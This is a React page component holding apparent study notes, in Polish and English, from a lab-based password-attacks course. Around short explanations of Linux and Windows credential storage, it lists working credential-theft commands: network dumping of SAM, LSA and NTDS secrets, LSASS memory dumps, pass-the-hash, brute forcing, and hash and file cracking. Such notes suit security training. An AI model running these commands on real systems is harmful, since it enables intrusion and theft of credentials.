import password from '../../assets/password.png';
import password_SAM from '../../assets/password_SAM.png';
import password_LSA_dumping from '../../assets/password_LSA_dumping.png';
import password_SAM_dumping from '../../assets/password_SAM_dumping.png';
import password_NTDS from '../../assets/password_NTDS.png';
import password_LSASS_dumping from '../../assets/password_LSASS_dumping.png';
import password_LSASS_dumping_ps from '../../assets/password_LSASS_dumping_ps.png';
import password_LSASS_dumping_result from '../../assets/password_LSASS_dumping_result.png';
import ExampleFrame from '../exampleFrame/ExampleFrame';
import { Link } from 'react-router-dom';

const Password = () =>{
    return(
        <section>
            <h1>Passwords Attacks</h1>
            <h2>Credentials</h2>
            <hr />
            <h2>Shadow File</h2>

            <p className="waring">htb-student:<span className="important">$y$j9T$3QSBB6CbHEu</span>...SNIP...f8Ms:18955:0:99999:7:::</p>
            <table>
                <tbody>
                    <tr className="normal">    
                        <td className="normal">htb-student:</td>
                        <td>$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:</td>
                        <td>18955:</td>
                        <td>0:</td>
                        <td>99999:</td>
                        <td>7:</td>
                        <td>:</td>
                        <td>:</td>
                        <td>:</td>
                    </tr>
                    <tr className="important">
                        <td><code>&lt;username&gt;</code>:</td>
                        <td><code>&lt;encrypted password&gt;</code>:</td>
                        <td><code>&lt;day of last change&gt;</code>:</td>
                        <td><code>&lt;min age&gt;</code>:</td>
                        <td><code>&lt;max age&gt;</code>:</td>
                        <td><code>&lt;warning period&gt;</code>:</td>
                        <td><code>&lt;inactivity period&gt;</code>:</td>
                        <td><code>&lt;expiration date&gt;</code>:</td>
                        <td><code>&lt;reserved field&gt;</code></td>
                    </tr>
                </tbody>
            </table>
            <table>
                <tbody>
                    <tr className="normal">
                        <td className="normal"><code>$ &lt;id&gt;</code></td>
                        <td><code>$ &lt;salt&gt;</code></td>
                        <td><code>$ &lt;hashed&gt;</code></td>
                    </tr>
                    <tr className="important">
                        <td><code>$ y</code></td>
                        <td><code>$ j9T</code></td>
                        <td><code>$ 3QSBB6CbHEu...SNIP...f8Ms</code></td>
                    </tr>
                </tbody>
            </table>
            <table>
                <thead>
                    <tr>
                    <th><strong>ID</strong></th>
                    <th><strong>Cryptographic Hash Algorytm</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>$1$</code></td>
                    <td><a href="https://en.wikipedia.org/wiki/MD5" target="_blank" rel="noopener nofollow">MD5</a></td>
                    </tr>
                    <tr>
                    <td><code>$2a$</code></td>
                    <td><a href="https://en.wikipedia.org/wiki/Blowfish_(cipher)" target="_blank" rel="noopener nofollow">Blowfish</a></td>
                    </tr>
                    <tr>
                    <td><code>$5$</code></td>
                    <td><a href="https://en.wikipedia.org/wiki/SHA-2" target="_blank" rel="noopener nofollow">SHA-256</a></td>
                    </tr>
                    <tr>
                    <td><code>$6$</code></td>
                    <td><a href="https://en.wikipedia.org/wiki/SHA-2" target="_blank" rel="noopener nofollow">SHA-512</a></td>
                    </tr>
                    <tr>
                    <td><code>$sha1$</code></td>
                    <td><a href="https://en.wikipedia.org/wiki/SHA-1" target="_blank" rel="noopener nofollow">SHA1crypt</a></td>
                    </tr>
                    <tr>
                    <td><code>$y$</code></td>
                    <td><a href="https://github.com/openwall/yescrypt" target="_blank" rel="noopener nofollow">Yescrypt</a></td>
                    </tr>
                    <tr>
                    <td><code>$gy$</code></td>
                    <td><a href="https://www.openwall.com/lists/yescrypt/2019/06/30/1" target="_blank" rel="noopener nofollow">Gost-yescrypt</a></td>
                    </tr>
                    <tr>
                    <td><code>$7$</code></td>
                    <td><a href="https://en.wikipedia.org/wiki/Scrypt" target="_blank" rel="noopener nofollow">Scrypt</a></td>
                    </tr>
                </tbody>
            </table>

            <hr />
            <h2>Passwd file</h2>
            <p className="waring">htb-student:<span className="important">x</span>:1000:1000:,,,:/home/htb-student:/bin/bash</p>
            <table>
                <tbody>
                    <tr>
                        <td  className="normal"><code>htb-student:</code></td>
                        <td><code>x:</code></td>
                        <td><code>1000:</code></td>
                        <td><code>1000:</code></td>
                        <td><code>,,,:</code></td>
                        <td><code>/home/htb-student:</code></td>
                        <td><code>/bin/bash</code></td>
                    </tr>
                    <tr className="important">
                        <td><code>&lt;username&gt;:</code></td>
                        <td><code>&lt;password&gt;:</code></td>
                        <td><code>&lt;uid&gt;:</code></td>
                        <td><code>&lt;gid&gt;:</code></td>
                        <td><code>&lt;comment&gt;:</code></td>
                        <td><code>&lt;home directory&gt;:</code></td>
                        <td><code>&lt;cmd executed after logging in&gt;</code></td>
                    </tr>
                </tbody>
            </table>
            <p>Znak <span className="important">x</span> w polu hasła wskazuje, że zaszyfrowane hasło znajduje się w pliku <span className="important">/etc/shadow</span>. Jednak przekierowanie do pliku <span className="important">/etc/shadow</span> nie czyni użytkowników systemu niezniszczalnymi, ponieważ jeśli prawa do tego pliku zostaną ustawione niepoprawnie, plik można zmanipulować tak, aby użytkownik <span className="important">root</span> nie musiał wpisywać hasła do logowania in. Dlatego puste pole oznacza, że ​​możemy zalogować się nazwą użytkownika bez podawania hasła.</p>
            <hr />

            <h2>Windows Authentication</h2>

            <ExampleFrame screen={password} />
            <p>Winlogon to jedyny proces, który przechwytuje żądania logowania z klawiatury wysyłane za pośrednictwem wiadomości <span className='important'>RPC z pliku Win32k.sys</span>. Winlogon natychmiast uruchamia aplikację <span className='important'>LogonUI</span> podczas logowania, aby wyświetlić interfejs użytkownika do logowania. Gdy Winlogon uzyska nazwę użytkownika i hasło od dostawców poświadczeń, wywołuje <span className='important'>LSASS</span> w celu uwierzytelnienia użytkownika próbującego się zalogować.</p>
            <p>Usługa podsystemu urzędu zabezpieczeń lokalnych <span className='important'>(LSASS)</span> to zbiór wielu modułów i ma dostęp do wszystkich procesów uwierzytelniania, które można znaleźć w <span className='important'>%SystemRoot%\System32\Lsass.exe</span>. Usługa ta odpowiada za lokalną politykę bezpieczeństwa systemu, uwierzytelnianie użytkowników oraz wysyłanie dzienników audytu bezpieczeństwa do dziennika zdarzeń. Innymi słowy, jest to skarbiec systemów operacyjnych opartych na systemie Windows</p>
        
            <table class="table table-striped text-left">
                <thead>
                    <tr>
                    <th><strong>Pakiety uwierzytelniające</strong></th>
                    <th><strong>Opis</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>Lsasrv.dll</code></td>
                    <td>Usługa serwera LSA egzekwuje zasady bezpieczeństwa i pełni funkcję menedżera pakietów zabezpieczeń dla LSA. LSA zawiera funkcję Negocjuj, która wybiera protokół NTLM lub Kerberos po ustaleniu, który protokół ma działać pomyślnie.</td>
                    </tr>
                    <tr>
                    <td><code>Msv1_0.dll</code></td>
                    <td>Pakiet uwierzytelniania do logowania na komputerze lokalnym, które nie wymaga uwierzytelniania niestandardowego.</td>
                    </tr>
                    <tr>
                    <td><code>Samsrv.dll</code></td>
                    <td>Menedżer kont zabezpieczeń (The Security Accounts Manager - SAM) przechowuje lokalne konta zabezpieczeń, egzekwuje lokalnie przechowywane zasady i obsługuje interfejsy API.</td>
                    </tr>
                    <tr>
                    <td><code>Kerberos.dll</code></td>
                    <td>Pakiet zabezpieczeń załadowany przez LSA do uwierzytelniania opartego na protokole Kerberos na komputerze.</td>
                    </tr>
                    <tr>
                    <td><code>Netlogon.dll</code></td>
                    <td>Usługa logowania oparta na sieci.</td>
                    </tr>
                    <tr>
                    <td><code>Ntdsa.dll</code></td>
                    <td>Ta biblioteka służy do tworzenia nowych rekordów i folderów w rejestrze systemu Windows.</td>
                    </tr>
                </tbody>
            </table>
            <p>Każda interaktywna sesja logowania tworzy oddzielną instancję usługi Winlogon. Architektura graficznej identyfikacji i uwierzytelniania <span className='important'>(GINA)</span> jest ładowana do obszaru procesów używanego przez Winlogon, odbiera i przetwarza poświadczenia oraz wywołuje interfejsy uwierzytelniania za pośrednictwem funkcji <span className='important'>LSALogonUser</span>.</p>
            <p><span className='important'>Security Account Manager (SAM)</span> to plik bazy danych w systemach operacyjnych Windows, który przechowuje hasła użytkowników. Można go używać do uwierzytelniania użytkowników lokalnych i zdalnych. SAM wykorzystuje środki kryptograficzne, aby uniemożliwić nieuwierzytelnionym użytkownikom dostęp do systemu. Hasła użytkowników są przechowywane w formacie skrótu w strukturze rejestru jako skrót <span className='important'>LM lub skrót NTLM. Plik ten znajduje się w %SystemRoot%/system32/config/SAM i jest zamontowany na HKLM/SAM</span>. Aby go wyświetlić, wymagane są uprawnienia na poziomie SYSTEMU. Podczas konfiguracji systemy Windows można przypisać do grupy roboczej lub domeny. Jeśli system został przypisany do grupy roboczej, obsługuje lokalnie bazę danych SAM i przechowuje lokalnie wszystkich istniejących użytkowników w tej bazie danych. Jeśli jednak system został przyłączony do domeny, kontroler domeny (DC) musi sprawdzić poświadczenia z bazy danych Active Directory (ntds.dit), która jest przechowywana w %SystemRoot%\ntds.dit.</p>
            <p>Menedżer poświadczeń to funkcja wbudowana we wszystkie systemy operacyjne Windows, która umożliwia użytkownikom zapisywanie poświadczeń używanych w celu uzyskania dostępu do różnych zasobów sieciowych i witryn internetowych. Zapisane poświadczenia są przechowywane na podstawie profili użytkowników w skrzynce poświadczeń każdego użytkownika. Poświadczenia są szyfrowane i przechowywane w następującej lokalizacji: PS <span className='important'>C:\Users\[Nazwa użytkownika]\AppData\Local\Microsoft\[Vault/Credentials]\ </span> Istnieją różne metody odszyfrowywania poświadczeń zapisanych za pomocą Menedżera poświadczeń. W tym module będziemy ćwiczyć praktyczne korzystanie z niektórych z tych metod.</p>
        
            <hr />
            <h2>Mutacje hasła</h2>

            <table class="table table-striped text-left">
                <thead>
                    <tr>
                    <th><strong>Funkcja</strong></th>
                    <th><strong>Opis</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>:</code></td>
                    <td>Nic nie rób.</td>
                    </tr>
                    <tr>
                    <td><code>l</code></td>
                    <td>Wszystkie litery małe.</td>
                    </tr>
                    <tr>
                    <td><code>u</code></td>
                    <td>Wszystkie litery wielkie.</td>
                    </tr>
                    <tr>
                    <td><code>c</code></td>
                    <td>Pierwszą literę pisz wielką, a pozostałe małymi.</td>
                    </tr>
                    <tr>
                    <td><code>sXY</code></td>
                    <td>Zamień wszystkie wystąpienia X na Y.</td>
                    </tr>
                    <tr>
                    <td><code>$!</code></td>
                    <td>Na końcu dodaj znak wykrzyknika.</td>
                    </tr>
                </tbody>
            </table>

            <div className='waring'>
                <p className='important'>custom.rule</p>
                <p>:</p>
                <p>c</p>
                <p>so0</p>
                <p>c so0</p>
                <p>sa@</p>
                <p>c sa@</p>
                <p>c sa@ so0</p>
                <p>$!</p>
                <p>$! c</p>
                <p>$! so0</p>
                <p>$! sa@</p>
                <p>$! c so0</p>
                <p>$! c sa@</p>
                <p>$! so0 sa@</p>
                <p>$! c so0 sa@</p>
            </div>
            <div className='waring'>
                <p className='important'>cat password.list</p>
                <p>password</p>
            </div>

            <p className='important'>hashcat --force password.list -r custom.rule --stdout | sort -u {`>`} mut_password.list</p>

            <hr />

            <h2>Password Attacks</h2>
            <table>
                <thead>
                    <tr>
                    <th><strong>Command</strong></th>
                    <th><strong>Description</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>crackmapexec winrm &lt;ip&gt; -u user.list -p password.list</code></td>
                    <td>Używa CrackMapExec przez WinRM do próby brutalnego wymuszenia nazw użytkowników i haseł określonych hostowanych na obiekcie docelowym.</td>
                    </tr>
                    <tr>
                    <td><code>crackmapexec smb &lt;ip&gt; -u "user" -p "password" --shares</code></td>
                    <td>Używa CrackMapExec do wyliczenia udziałów SMB na obiekcie docelowym przy użyciu określonego zestawu poświadczeń.</td>
                    </tr>
                    <tr>
                    <td><code>crackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --sam</code></td>
                    <td>Używa CrackMapExec w połączeniu z poświadczeniami administratora do zrzutu skrótów haseł przechowywanych w SAM przez sieć.</td>
                    </tr>
                    <tr>
                    <td><code>crackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --lsa</code></td>
                    <td>Używa CrackMapExec w połączeniu z uprawnieniami administratora do zrzucania sekretów LSA przez sieć. W ten sposób można uzyskać dane uwierzytelniające w postaci zwykłego tekstu.</td>
                    </tr>
                    <tr>
                    <td><code>crackmapexec smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --ntds</code></td>
                    <td>Używa CrackMapExec w połączeniu z uprawnieniami administratora do zrzucania skrótów z pliku ntds przez sieć.</td>
                    </tr>
                    <tr>
                    <td><code>evil-winrm -i &lt;ip&gt; -u Administrator -H "&lt;passwordhash&gt;"</code></td>
                    <td>Używa Evil-WinRM do ustanowienia sesji Powershell z celem systemu Windows przy użyciu skrótu użytkownika i hasła. Jest to jeden z typów ataku <code>Pass-The-Hash</code>.</td>
                    </tr>
                    <tr>
                    <td><code>hydra -L user.list -P password.list &lt;service&gt;://&lt;ip&gt;</code></td>
                    <td>Używa Hydra w połączeniu z listą użytkowników i listą haseł, aby podjąć próbę złamania hasła w określonej usłudze.</td>
                    </tr>
                    <tr>
                    <td><code>hydra -l username -P password.list &lt;service&gt;://&lt;ip&gt;</code></td>
                    <td>Używa Hydra w połączeniu z listą nazw użytkowników i haseł, aby podjąć próbę złamania hasła w określonej usłudze.</td>
                    </tr>
                    <tr>
                    <td><code>hydra -L user.list -p password &lt;service&gt;://&lt;ip&gt;</code></td>
                    <td>Używa Hydra w połączeniu z listą użytkowników i hasłem, aby podjąć próbę złamania hasła w określonej usłudze.</td>
                    </tr>
                    <tr>
                    <td><code>hydra -C &lt;user_pass.list&gt; ssh://&lt;IP&gt;</code></td>
                    <td>Używa Hydra w połączeniu z listą poświadczeń, aby podjąć próbę zalogowania się do celu za pośrednictwem określonej usługi. Można to wykorzystać do próby ataku polegającego na upychaniu poświadczeń.</td>
                    </tr>
                </tbody>
            </table>

            <hr />
            <h2>Attack SAM</h2>

            <table class="table table-striped text-left">
                <thead>
                    <tr>
                        <th>Ul rejestru</th>
                        <th>Opis</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><code>hklm\sam</code></td>
                        <td>Zawiera skróty powiązane z hasłami do kont lokalnych. Będziemy potrzebować skrótów, abyśmy mogli je złamać i uzyskać hasła do kont użytkowników w postaci zwykłego tekstu.</td>
                    </tr>
                    <tr>
                        <td><code>hklm\system</code></td>
                        <td>Zawiera klucz rozruchowy systemu, który służy do szyfrowania bazy danych SAM. Będziemy potrzebować klucza rozruchowego do odszyfrowania bazy danych SAM.</td>
                    </tr>
                    <tr>
                        <td><code>hklm\security</code></td>
                        <td>Zawiera buforowane poświadczenia dla kont domeny. Możemy odnieść korzyść z posiadania tego w docelowym systemie Windows przyłączonym do domeny.</td>
                    </tr>
                </tbody>
            </table>

            <div className='waring'>
                <p>C:\WINDOWS\system32{`>`} <span className='important'>reg.exe save hklm\sam C:\sam.save</span></p>
                <p>C:\WINDOWS\system32{`>`} <span className='important'>reg.exe save hklm\system C:\system.save</span></p>
                <p>C:\WINDOWS\system32{`>`} <span className='important'>reg.exe save hklm\security C:\security.save</span></p>
            </div>

            <div className='waring'>
                <Link to='https://github.com/FilipowiczP/impacket/blob/master/examples/secretsdump.py'>secretsdump</Link>
                <p>python3 ./secretsdump.py -sam <span className='important'>sam.save</span> -security <span className='important'>security.save</span> -system <span className='important'>system.save</span> LOCAL</p>
            </div>
            <ExampleFrame screen={password_SAM} />

            <div className='waring'>
                <p><span className='important'>vim hashestocrack.txt</span></p>
                <p>64f12cddaa88057e06a81b54e73b949b</p>
                <p>31d6cfe0d16ae931b73c59d7e0c089c0</p>
                <p>6f8c3f4d3869a10f3b4f0522f537fd33</p>
                <p>184ecdda8cf1dd238d438c4aea4d560d</p>
                <p>f7eb9c06fafaa23c4bcf22ba6781c1e2</p>
            </div>

            <div className='waring'>
                <p><span className='important'>hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt</span></p>
            </div>

            <h3>Zdalne zrzucanie sekretów LSA</h3>
            <div className='waring'>
                <p>crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</p>
            </div>
            <ExampleFrame screen={password_LSA_dumping} />

            <h3>Zdalne zrzucanie sekretów SAM</h3>
            <div className='waring'>
                <p>crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</p>
            </div>
            <ExampleFrame screen={password_SAM_dumping} />

            <hr />
            <h2>Atakowanie LSASS</h2>
            <ExampleFrame screen={password_LSASS_dumping} />
            <p>Stowrzymy plik <span className='important'>lsass.DMP</span> w <span className='important'>C:\Users\loggedonusersdirectory\AppData\Local\Temp</span></p>
            <div className='waring'>
                <p>Można utworzyć plik za pomocą Powershell</p>
                <p>Używamy do tego methody</p>
                <br />
                <p><span className='important'>tasklist /svc</span></p>
                <p>lub</p>
                <p><span className='important'>Get-Process lsass</span></p>
                <p>potrzebujemy ID (PID) dla lsass.exe</p>
            </div>
            <ExampleFrame screen={password_LSASS_dumping_ps} />

            <div className='waring'>
                <p>PS C:\Windows\system32{`>`} <span className='important'>rundll32 C:\windows\system32\comsvcs.dll, MiniDump </span>672 <span className='important'>C:\lsass.dmp full</span></p>
            </div>

            <div className='waring'>
                <p>pypykatz lsa minidump /home/peter/Documents/lsass.dmp </p>
            </div>

            <ExampleFrame screen={password_LSASS_dumping_result} />
            <p><span className='important'>MSV</span> to pakiet uwierzytelniający w systemie Windows, który LSA wywołuje w celu sprawdzenia poprawności prób logowania w bazie danych SAM. Pypykatz wyodrębnił identyfikator <span className='important'>SID, nazwę użytkownika, domenę, a nawet skróty haseł NT i SHA1 </span> powiązane z sesją logowania konta użytkownika bob przechowywaną w pamięci procesu LSASS. Okaże się to pomocne w ostatnim etapie naszego ataku opisanego na końcu tej sekcji.</p>
            <p><span className='important'>WDIGEST</span> to starszy protokół uwierzytelniania domyślnie włączony w <span className='important'>systemach Windows XP — Windows 8 i Windows Server 2003 — Windows Server 2012</span>. LSASS buforuje poświadczenia używane przez funkcję WDIGEST w postaci zwykłego tekstu. Oznacza to, że jeśli naszym celem będzie system Windows z włączoną funkcją WDIGEST, najprawdopodobniej zobaczymy hasło w postaci zwykłego tekstu. W nowoczesnych systemach operacyjnych Windows funkcja WDIGEST jest domyślnie wyłączona. Ponadto należy pamiętać, że firma Microsoft wydała aktualizację zabezpieczeń dla systemów dotkniętych tym problemem za pomocą WDIGEST. Tutaj możemy zapoznać się ze szczegółami tej aktualizacji zabezpieczeń.</p>
            <p><span className='important'>Kerberos</span> to protokół uwierzytelniania sieciowego używany przez usługę Active Directory w środowiskach domeny Windows. Konta użytkowników domeny otrzymują bilety po uwierzytelnieniu w usłudze Active Directory. Ten bilet umożliwia użytkownikowi dostęp do udostępnionych zasobów w sieci, do których uzyskał dostęp, bez konieczności każdorazowego wpisywania swoich danych uwierzytelniających. <span className='important'>LSASS buforuje hasła, e-klucze, bilety i kody PIN </span>powiązane z protokołem Kerberos. Możliwe jest wyodrębnienie ich z pamięci procesu LSASS i wykorzystanie ich w celu uzyskania dostępu do innych systemów dołączonych do tej samej domeny.</p>
        
            <div className='waring'>
                <p>hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</p>
            </div>

            <hr />
            <h2>NTDS.dit</h2>

            <div className='waring'>
                <p>crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt</p>
                <br />
                <p>crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds</p>
            </div>
            <ExampleFrame screen={password_NTDS} />

            <hr />
            <h2>Lazagne all</h2>

            <Link to='https://github.com/AlessandroZ/LaZagne/releases/'>Lazagne</Link>

            <div className='waring'>
                <p>start lazagne.exe all</p>
            </div>

            <hr />
            <h2>Cracking Linux Credential</h2>
            <div className='waring'>
                <p>cp /etc/passwd /tmp/passwd.bak </p>
                <p>cp /etc/shadow /tmp/shadow.bak </p>
                <p>unshadow /tmp/passwd.bak /tmp/shadow.bak {`>`} /tmp/unshadowed.hashes</p>
                <br />
                <p>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</p>
            </div>

            <hr />
            <h2>Cracking files</h2>

            <div className='waring'>
                <p>locate *2john*</p>
            </div>

            <h3>SSH</h3>
            <div className='waring'>
                <p><span className='important'>ssh2john.py</span> SSH.private {`>`} ssh.hash</p>
                <p>john --wordlist=rockyou.txt ssh.hash</p>
                <p>john ssh.hash --show</p>
            </div>

            <h3>Office document</h3>
            <div className='waring'>
                <p><span className='important'>office2john.py</span> Protected.docx {'>'} protected-docx.hash</p>
                <p>john --wordlist=rockyou.txt protected-docx.hash</p>
                <p>john protected-docx.hash --show</p>
            </div>

            <h3>PDF</h3>
            <div className='waring'>
                <p><span className='important'>pdf2john.py</span> PDF.pdf {'>'} pdf.hash</p>
                <p>john --wordlist=rockyou.txt pdf.hash</p>
                <p>john pdf.hash --show</p>
            </div>

            <h3>ZIP</h3>
            <div className='waring'>
                <p><span className='important'>zip2john</span> ZIP.zip {'>'} zip.hash</p>
                <p>john --wordlist=rockyou.txt zip.hash</p>
                <p>john zip.hash --show</p>
            </div>

            <h3>Bitlocker</h3>
            <div className='waring'>
                <p><span className='important'>bitlocker2john</span> -i Backup.vhd {'>'} backup.hashes</p>
                <p>grep "bitlocker\$0" backup.hashes {'>'} backup.hash</p>
                <p>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</p>
            </div>


        </section>  
    )
}

export default Password;